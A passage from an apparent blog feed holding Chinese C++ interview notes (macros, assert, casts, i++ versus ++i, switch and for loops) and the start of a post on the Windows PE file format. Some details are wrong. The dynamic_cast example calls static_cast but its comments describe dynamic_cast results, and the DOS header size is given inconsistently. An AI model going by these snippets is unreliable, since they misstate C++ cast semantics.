于是输出xy的值。</p><p>答案：</p><p>宏定义中的#运算符将其后面的宏参数转换为字符串；</p><p>宏定义中的##运算符将前后的宏参数进行字符串连接。</p><h3 id="简述assert断言的概念"><a href="#简述assert断言的概念" class="headerlink" title="简述assert断言的概念"></a>简述assert断言的概念</h3><p>assert.h当中可以找到assert的定义,下面是MinGW的assert.h当中对assert的定义:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> RC_INVOKED</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* All the headers include this file. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;_mingw.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> assert</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>__cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NDEBUG</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If not debugging, assert does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> assert(x)((void)0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* debugging enabled */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CRTDLL nicely supplies a function which does the actual output and</span></span><br><span class="line"><span class="comment"> * call to abort.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">_CRTIMP <span class="keyword">void</span> __cdecl __MINGW_NOTHROW _assert (<span class="keyword">const</span> <span class="keyword">char</span>*, <span class="keyword">const</span> <span class="keyword">char</span>*, <span class="keyword">int</span>) __MINGW_ATTRIB_NORETURN;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Definition of the assert macro.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> assert(e)       ((e) ? (void)0 : _assert(#e, __FILE__, __LINE__))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span><span class="comment">/* NDEBUG */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>__cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* Not RC_INVOKED */</span></span></span><br></pre></td></tr></table></figure><p>分析：</p><p>有些人认为assert是一个程序DEBUG版本中的程序错误检测函数，但其实assert是一个带参数的宏。</p><p>在程序中用assert检查条件表达式，如果表达式为false，表示检测失败，程序会向标准错误流stderr中输入一条错误信息再调用about函数终止程序。</p><p>但是assert宏的使用影响程序性能，一个良好的编程习惯是再调试结束后#define NDEBUG禁用assert宏()。</p><p>虽然assert可以检测多个条件，但不推荐，因为如果assert失败，将无法判断哪个条件影响了结果。所以最好每个assert检测一个条件。不要在assert中修改变量的值，因为assert只在DEBUG版本中生效，若程序为RELEASE版本，assert内部对变量的修改也会随之失效。</p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>C++在变量命名时要求变量名中只能包含字母、数字、下划线三种字符，并且第一个字符必须是字母或者下划线。</p><p>使用static修饰的局部变量称为静态局部变量，作用域是函数内部，生存期是整个程序的生命周期。</p><p>使用const修饰的变量称为常量型变量，初始化过后不能进行修改。</p><h2 id="经典面试题-2"><a href="#经典面试题-2" class="headerlink" title="经典面试题"></a>经典面试题</h2><h3 id="i-和-i的区别"><a href="#i-和-i的区别" class="headerlink" title="i++和++i的区别"></a>i++和++i的区别</h3><p>写出下面代码执行后i、j、m、n的值：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> m = (i++) + (i++) + (i++);</span><br><span class="line"><span class="keyword">int</span> n = (++j) + (++j) + (++j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>上面程序的反汇编代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">   <span class="number">0x00401520</span> &lt;+<span class="number">0</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x00401521</span> &lt;+<span class="number">1</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x00401523</span> &lt;+<span class="number">3</span>&gt;:<span class="keyword">and</span>    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x00401526</span> &lt;+<span class="number">6</span>&gt;:sub    esp,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x00401529</span> &lt;+<span class="number">9</span>&gt;:call   <span class="number">0x401fb0</span> &lt;__main&gt;</span><br><span class="line">=&gt; <span class="number">0x0040152e</span> &lt;+<span class="number">14</span>&gt;:mov    DWORD PTR [esp+<span class="number">0xc</span>],<span class="number">0xa</span></span><br><span class="line">   <span class="number">0x00401536</span> &lt;+<span class="number">22</span>&gt;:mov    DWORD PTR [esp+<span class="number">0x8</span>],<span class="number">0xa</span></span><br><span class="line">   <span class="number">0x0040153e</span> &lt;+<span class="number">30</span>&gt;:mov    edx,DWORD PTR [esp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x00401542</span> &lt;+<span class="number">34</span>&gt;:lea    eax,[edx+<span class="number">0x1</span>]</span><br><span class="line">   <span class="number">0x00401545</span> &lt;+<span class="number">37</span>&gt;:mov    DWORD PTR [esp+<span class="number">0xc</span>],eax</span><br><span class="line">   <span class="number">0x00401549</span> &lt;+<span class="number">41</span>&gt;:mov    eax,DWORD PTR [esp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0040154d</span> &lt;+<span class="number">45</span>&gt;:lea    ecx,[eax+<span class="number">0x1</span>]</span><br><span class="line">   <span class="number">0x00401550</span> &lt;+<span class="number">48</span>&gt;:mov    DWORD PTR [esp+<span class="number">0xc</span>],ecx</span><br><span class="line">   <span class="number">0x00401554</span> &lt;+<span class="number">52</span>&gt;:lea    ecx,[edx+eax*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x00401557</span> &lt;+<span class="number">55</span>&gt;:mov    eax,DWORD PTR [esp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0040155b</span> &lt;+<span class="number">59</span>&gt;:lea    edx,[eax+<span class="number">0x1</span>]</span><br><span class="line">   <span class="number">0x0040155e</span> &lt;+<span class="number">62</span>&gt;:mov    DWORD PTR [esp+<span class="number">0xc</span>],edx</span><br><span class="line">   <span class="number">0x00401562</span> &lt;+<span class="number">66</span>&gt;:add    eax,ecx</span><br><span class="line">   <span class="number">0x00401564</span> &lt;+<span class="number">68</span>&gt;:mov    DWORD PTR [esp+<span class="number">0x4</span>],eax</span><br><span class="line">   <span class="number">0x00401568</span> &lt;+<span class="number">72</span>&gt;:add    DWORD PTR [esp+<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0040156d</span> &lt;+<span class="number">77</span>&gt;:add    DWORD PTR [esp+<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00401572</span> &lt;+<span class="number">82</span>&gt;:mov    eax,DWORD PTR [esp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00401576</span> &lt;+<span class="number">86</span>&gt;:lea    edx,[eax+eax*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x00401579</span> &lt;+<span class="number">89</span>&gt;:add    DWORD PTR [esp+<span class="number">0x8</span>],<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0040157e</span> &lt;+<span class="number">94</span>&gt;:mov    eax,DWORD PTR [esp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00401582</span> &lt;+<span class="number">98</span>&gt;:add    eax,edx</span><br><span class="line">   <span class="number">0x00401584</span> &lt;+<span class="number">100</span>&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   <span class="number">0x00401587</span> &lt;+<span class="number">103</span>&gt;:mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0040158c</span> &lt;+<span class="number">108</span>&gt;:leave  </span><br><span class="line">   <span class="number">0x0040158d</span> &lt;+<span class="number">109</span>&gt;:ret </span><br></pre></td></tr></table></figure><p>从上面的反汇编代码可以清楚的看到，i++是先执行加法操作，然后再进行自增；而++j是先自增，然后再执行加法操作。</p><p>但是，不同的编译器或许会得出不同的结果，再GCC编译器中，只要有两个完整的操作数就会立即执行加法运算。下图描述了两个不同编译器对同一个表达式在处理过程中的执行顺序。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210310231853.png" alt="编译器的执行顺序"></p><p>所以：不要书写上面这种可能产生二义性的代码，因为程序的运行结果依赖编译器的具体实现。</p><p>答案：</p><p>程序的运行结果依赖编译器的具体实现。</p><h3 id="简述静态全局变量的概念"><a href="#简述静态全局变量的概念" class="headerlink" title="简述静态全局变量的概念"></a>简述静态全局变量的概念</h3><p>答案：</p><p>全局变量前面加上static关键字，就定义了一个静态全局变量，静态全局变量的声明和定义放在源文件，且不能由extern</p><p>导出，故不同于普通全局变量的作用域是整个项目，静态全局变量的作用域仅限于定义静态全局变量的文件内部。</p><h3 id="C-类型转换操作符"><a href="#C-类型转换操作符" class="headerlink" title="C++类型转换操作符"></a>C++类型转换操作符</h3><p>C语言当中有强制类型转换符,但这不能对付复杂的自定义数据类型，所以C++提供了四种类型转换操作符<code>static_cast</code>、<code>dynamic_cast</code>、<code>const_case</code>和<code>reinterpret_cast</code>。</p><h4 id="static-cast"><a href="#static-cast" class="headerlink" title="static_cast"></a>static_cast</h4><p><code>static_cast</code>可以完全代替C语言风格的类型转换。此外还可以在父类指针和子类指针之间转换。如果父类指针指向父类对象，这种转换就不安全，但是父类指针指向子类对象，这种转换不存在安全问题。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">class <span class="title">Base</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span> <span class="keyword">public</span> Base&#123;&#125;;</span><br><span class="line">Base * b1 = <span class="keyword">new</span> Base;</span><br><span class="line">Base * b2 = <span class="keyword">new</span> Son;</span><br><span class="line">Son * s1 = <span class="keyword">static_cast</span>&lt;Son *&gt;(b1);<span class="comment">//转换成功，不安全</span></span><br><span class="line">Son * s2 = <span class="keyword">static_cast</span>&lt;Son *&gt;(b2);<span class="comment">//转换成功，安全</span></span><br></pre></td></tr></table></figure><h4 id="dynamic-cast"><a href="#dynamic-cast" class="headerlink" title="dynamic_cast"></a>dynamic_cast</h4><p><code>dynamic_cast</code>只能用于指针对象之间的类型转换，可以在父类指针和子类指针之间转换（引用也可以）。</p><p>不同于<code>static_cast</code>，<code>dynamic_cast</code>在将父类指针转换成子类指针时需要对背后的对象进行类型检查以确保类型完全匹配。只有当一个父类指针指向子类对象且父类中包含虚函数时，转换才会成功，否则返回空指针，如果是引用，则抛出异常。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">class Base()&#123;virtual void test()&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span> <span class="keyword">public</span> Base&#123;&#125;;</span><br><span class="line">Base * b1 = <span class="keyword">new</span> Base;</span><br><span class="line">Base * b2 = <span class="keyword">new</span> Son;</span><br><span class="line">Son * s1 = <span class="keyword">static_cast</span>&lt;Son *&gt;(b1);<span class="comment">//转换失败，返回NULL</span></span><br><span class="line">Son * s2 = <span class="keyword">static_cast</span>&lt;Son *&gt;(b2);<span class="comment">//转换成功</span></span><br><span class="line">Son &amp; s3 = <span class="keyword">static_cast</span>&lt;Son &amp;&gt;(*b1);<span class="comment">//转换失败，抛出异常</span></span><br><span class="line">Son &amp; s4 = <span class="keyword">static_cast</span>&lt;Son &amp;&gt;(*b2);<span class="comment">//转换成功</span></span><br></pre></td></tr></table></figure><h4 id="const-cast"><a href="#const-cast" class="headerlink" title="const_cast"></a>const_cast</h4><p><code>const_case</code>可以在转换过程在增加或者删除const属性。一般情况下，无法将常量指针直接赋值给普通指针，但是通过<code>const_case</code>可以移除常量指针的const属性。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span>&#125;</span><br><span class="line"><span class="keyword">const</span> A * a1 = <span class="keyword">new</span> A;</span><br><span class="line">A * a2 = <span class="keyword">const_cast</span>&lt;A * &gt;(a1);</span><br></pre></td></tr></table></figure><h4 id="reinterpret-cast"><a href="#reinterpret-cast" class="headerlink" title="reinterpret_cast"></a>reinterpret_cast</h4><p><code>reinterpret_cast</code>可以将一种类型的指针转换为另一种类型的指针（不论是否有继承关系）。此外还可以将指针转换为整数，整数转换为指针。<code>reinterpret_cast</code>还经常用在不同函数指针之间的转化。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span>&#125;;</span><br><span class="line">A * a = <span class="keyword">new</span> A;</span><br><span class="line">B * b = <span class="keyword">reinterpret_cast</span>&lt;B* &gt;(a);<span class="comment">//转换成功</span></span><br></pre></td></tr></table></figure><h1 id="条件和循环"><a href="#条件和循环" class="headerlink" title="条件和循环"></a>条件和循环</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>如果case分支内有break语句，则在执行完该case语句分支过后退出switch语句，否则继续执行剩下的代码。虽然switch语句完全可以用if语句代替，但是在一些情况下，switch语句可以写出更优雅的代码。</p><h2 id="经典面试题-3"><a href="#经典面试题-3" class="headerlink" title="经典面试题"></a>经典面试题</h2><h3 id="不使用break的语句"><a href="#不使用break的语句" class="headerlink" title="不使用break的语句"></a>不使用break的语句</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getMessage</span><span class="params">(<span class="keyword">char</span> mark)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> message = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span>(mark)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            message = <span class="string">&quot;Your year award:10 days trip in USA or UK,5k shopping card of supermarket, 2k coupon of Amazon, one month extra salary&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            message = <span class="string">&quot;Your year award:5k shopping card of supermarket, 2k coupon of Amazon, one month extra salary&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            message = <span class="string">&quot;Your year award: 2k coupon of Amazon, one month extra salary&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            message = <span class="string">&quot;Your year award: one month extra salary&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，上面的代码略显啰嗦，因为年终奖是按梯度排列的，高一梯度的奖品完全涵盖了第一梯度的奖品，基于此，我们将上面的代码稍作修改，使其变成下面的代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getMessage</span><span class="params">(<span class="keyword">char</span> mark)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> message = <span class="string">&quot;Your year award:&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span>(mark)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:message.append(<span class="string">&quot;10 days trip in USA or UK,&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:message.append(<span class="string">&quot;5k shopping card of supermarket,&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:message.append(<span class="string">&quot;2k coupon of Amazon,&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:message.append(<span class="string">&quot;one month extra salary&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="for循环的三要素"><a href="#for循环的三要素" class="headerlink" title="for循环的三要素"></a>for循环的三要素</h3><p>写出下面程序的输出结果：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; c;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(foo(<span class="string">&#x27;A&#x27;</span>); foo(<span class="string">&#x27;B&#x27;</span>) &amp;&amp; (i++ &lt; <span class="number">2</span>); foo(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        foo(<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析如下：</p><p>第一次循环：首先执行初始化表达式<code>foo(&#39;A&#39;)</code>输出A，然后执行循环条件判断语句<code>foo(&#39;B&#39;) &amp;&amp; (i++ &lt; 2)</code>输出B，并且i++，然后执行循环体语句<code>foo(&#39;D&#39;)</code>输出D，最后执行<code>foo(&#39;C&#39;)</code>语句输出C；</p><p>第二次循环：初始化表达式<code>foo(&#39;A&#39;)</code>不再执行，执行循环条件判断语句<code>foo(&#39;B&#39;) &amp;&amp; (i++ &lt; 2)</code>输出B，并且i++，此时i先和2比较，然后再自增，自增过后i = 2，然后执行循环体语句<code>foo(&#39;D&#39;)</code>输出D，最后执行<code>foo(&#39;C&#39;)</code>语句输出C；</p><p>第三次循环：直接执行循环条件判断语句<code>foo(&#39;B&#39;) &amp;&amp; (i++ &lt; 2)</code>输出B，此时i = 2,跳出循环；</p><p>综上：ABDCBDCB。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;main函数&quot;&gt;&lt;a href=&quot;#main函数&quot; class=&quot;headerlink&quot; title=&quot;main函数&quot;&gt;&lt;/a&gt;main函数&lt;/h1&gt;&lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点</summary>
      
    
    
    
    <category term="C++" scheme="http://0xnope.top/categories/C/"/>
    
    
    <category term="C++" scheme="http://0xnope.top/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>PE文件总结</title>
    <link href="http://0xnope.top/2021/03/06/PE%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/"/>
    <id>http://0xnope.top/2021/03/06/PE%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-06T14:28:37.000Z</published>
    <updated>2021-03-14T14:15:40.329Z</updated>
    
    <content type="html"><![CDATA[<p>写点笔记做点记录，一些PE文件的粗浅认识。</p><h1 id="PE文件格式图总览"><a href="#PE文件格式图总览" class="headerlink" title="PE文件格式图总览"></a>PE文件格式图总览</h1><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223247.png" alt="20200127181931983"></p><h1 id="PE文件格式介绍"><a href="#PE文件格式介绍" class="headerlink" title="PE文件格式介绍"></a>PE文件格式介绍</h1><p>PE（Portable Execute）文件是Windows下可执行文件的总称，常见的有EXE、SCR、DLL、OCX、CPL、DRV、SYS、VXD、OBJ等，事实上，一个文件是否是PE文件与其扩展名无关，PE文件可以是任何扩展名。<br>认识PE文件不是作为单一内存映射文件被装入内存是很重要的。Windows加载器（又称PE加载器）遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。由于磁盘对齐与内存对齐的不一样，加载到内存的PE文件与磁盘上的PE文件各个部分的分布有差异。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223318.png" alt="20200127182012611"></p><p>先简单说明一下几个知识点：<br>1 从DOS头到节区头是PE头（NT头）部分，其下的节区合称为PE体。<br>2 文件中使用偏移（offset），内存中使用VA(VirtualAddress 虚拟地址)来表示位置。<br>3 文件加载到内存中时，情况就会发生变化。文件的内容一般可以分为代码（.text）、数据(.data)、资源（.rsrc）节，分别保存。<br>4 PE头与各节区的尾部存在一个区域，称为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数位置上，空白区域将用NULL填充。<br>5 VA&amp;RVA，VA是进程虚拟内存的绝对地址，RVA指的是从某个基准位置开始的相对地址。计算公式如下：<br>RVA+ImageBase=VA<br>PE头内部信息大多数是以RVA形式存在，因为PE文件加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他的PE文件，这个时候必须通过重定位来将其加载到其他空白的位置。</p><p>总括一下：<br>PE就是在windows下最常用的可执行文件格式，在PE文件中代码，已经初始化的数据，资源和重定位信息等数据被按照属性分类放在不同的section（简称节）中，每个节的属性和位置等信息用一个IMAGE_SECTION_HEADER结构来描述，所有的IMAGE_SECTION_HEADER结构组成一个节表（Section table），节表数据在PE文件中被放在所有节数据的前面，由于数据是按照属性在节中放置的，不同用途但是属性相同的数据（如导入表，导出表等吧。。。可能被放在同一个节中），所以PE结构还用一系列的数据目录结构IMAGE_DATA_DIRECTORY来分别来指明这些数据的位置。<br>数据目录表和其他描述文件属性的数据合在一起称为PE头文件，PE头文件被放置在节和节表的前面，<br>为了与DOS系统的文件格式相容又加上了包括IMAGE_DOS_HEADER结构和DOS Stub的DOS部分</p><h1 id="PE结构分析"><a href="#PE结构分析" class="headerlink" title="PE结构分析"></a>PE结构分析</h1><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223352.png" alt="20200127182053202"></p><p>正如上图所示，pe文件由DOS部首，PE头，节区表，节区，调试信息组成<br>接下来我们用notepad.exe与PE文件的各个部分对比进行演示，稍显不那么枯燥和抽象。</p><h2 id="DOS头（40字节）"><a href="#DOS头（40字节）" class="headerlink" title="DOS头（40字节）"></a>DOS头（40字节）</h2><p>PE文件都是以一个64字节的DOS头开始。这个DOS头只是为了兼容早期的DOS操作系统。总共占40个字节，结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_DOS_HEADER</span>&#123;</span></span><br><span class="line">      WORD e_magic;<span class="comment">//DOS头的标识，为4Dh和5Ah。分别为字母MZ</span></span><br><span class="line">      WORD e_cblp;</span><br><span class="line">      WORD e_cp;</span><br><span class="line">      WORD e_crlc;</span><br><span class="line">      WORD e_cparhdr;</span><br><span class="line">      WORD e_minalloc;</span><br><span class="line">      WORD e_maxalloc;</span><br><span class="line">      WORD e_ss;</span><br><span class="line">      WORD e_sp;</span><br><span class="line">      WORD e_csum;</span><br><span class="line">      WORD e_ip;</span><br><span class="line">      WORD e_cs;</span><br><span class="line">      WORD e_lfarlc;</span><br><span class="line">      WORD e_ovno;</span><br><span class="line">      WORD e_res[<span class="number">4</span>];</span><br><span class="line">      WORD e_oemid;</span><br><span class="line">      WORD e_oeminfo;</span><br><span class="line">      WORD e_res2[<span class="number">10</span>];</span><br><span class="line">      DWORD e_lfanew;             <span class="comment">//指向IMAGE_NT_HEADERS的所在</span></span><br><span class="line">&#125;IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>看到上面结构体众多的成员直接浇灭学习的热情，但是我们只需要关心两个重要成员，e_magic和e_lfanew。前者为DOS头的标识，后者指向NT头，也就是PE头。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223502.png" alt="20200127182247996"></p><p>DOS头后跟一个DOS Stub数据，也就是DOS存根，一般是“This program cannot run in DOS mode”（这个可以通过修改链接器的设置来修改成自己定义的数据）。<br>里面是16位汇编代码，用debug可以看（-u:Unassemble），64位系统看不了。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210306223517.png" alt="2020012718235670"></p><h2 id="PE头（248字节：4-20-224）"><a href="#PE头（248字节：4-20-224）" class="headerlink" title="PE头（248字节：4+20+224）"></a>PE头（248字节：4+20+224）</h2><p>紧跟着DOS stub的时PE头文件（PE Header）。PE Header是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，其中包含许多PE装载器用到的重要字段。执行体在支持PE文件结构的操作系统中执行时，PE装载器将从IMAGE_DOS_HEADER结构中的e_lfanew字段里找到PE Header的起始偏移量，加上基址得到PE文件头的指针。<br>PE头的数据结构被定义为IMAGE_NT_HEADERS。包含三部分，其结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IMAGE_NT_HEADERS</span>&#123;</span></span><br><span class="line">      DWORD Signature;<span class="comment">//PE头标识 50450000</span></span><br><span class="line">      IMAGE_FILE_HEADER FileHeader;<span class="comment">//文件头</span></span><br><span class="line">      IMAGE_OPTIONAL_HEADER32 OptionalHeader;<span class="comment">//可选头</span></span><br><span class="line">&#125;IMAGE_NT_HEADERS,*PIMAGE_NT_HEADERS;</span><br></pre></td></tr></table></figure><h3 id="Signature字段："><a href="#Signature字段：" class="headerlink" title="Signature字段："></a>Signature字段：</h3><p>PE头的标识。双字结构。为50h, 45h, 00h, 00h. 即“PE\0\0”。</p><h3 id="FileHeader字段：文件头"><a href="#FileHeader字段：文件头" class="headerlink" title="FileHeader字段：文件头"></a>FileHeader字段：文件头</h3><p>IMAGE_FILE_HEADER（文件头）结构包含了文件的物理层信息及文件属性。共20字节的数据，其结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;<span class="comment">//运行平台</span></span><br><span class="line">    WORD    NumberOfSections;<span class="comment">//文件的节区数目</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//文件创建日期和时间</span></span><br><span class="line">    DWORD   PointerToSymbolTable;<span class="comment">//指向符号表（用于调试）</span></span><br><span class="line">    DWORD   NumberOfSymbols;<span class="comment">//符号表中符号个数（用于调试）</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;<span class="comment">//IMAGE_OPTIONAL_HEADER32结构大小</span></span><br><span class="line">    WORD    Characteristics;<span class="comment">//文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><strong>Machine</strong>：每个CPU都有唯一的机器码，具体如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_UNKNOWN           0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_I386              0x014c  <span class="comment">// Intel 386.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R3000             0x0162  <span class="comment">// MIPS little-endian, 0x160 big-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R4000             0x0166  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_R10000            0x0168  <span class="comment">// MIPS little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_WCEMIPSV2         0x0169  <span class="comment">// MIPS little-endian WCE v2</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_ALPHA             0x0184  <span class="comment">// Alpha_AXP</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_SH3               0x01a2  <span class="comment">// SH3 little-endian</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> 